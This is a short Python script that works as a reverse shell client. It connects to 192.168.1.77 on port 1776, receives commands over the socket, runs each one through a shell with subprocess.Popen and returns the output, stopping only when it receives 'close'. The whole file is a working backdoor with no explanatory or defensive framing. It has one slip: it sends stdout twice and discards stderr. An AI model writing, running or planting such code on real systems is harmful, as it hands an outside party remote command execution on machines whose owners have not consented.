import socket
import subprocess

def connect():
    s= socket.socket()
    s.connect(("192.168.1.77",1776))
    while True:
        command = s.recv(1024)
        if 'close' in command.decode():
            s.close()
            break
        elif command != '':
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stdout.read())

def main():
    connect()

if __name__== "__main__":
   main()
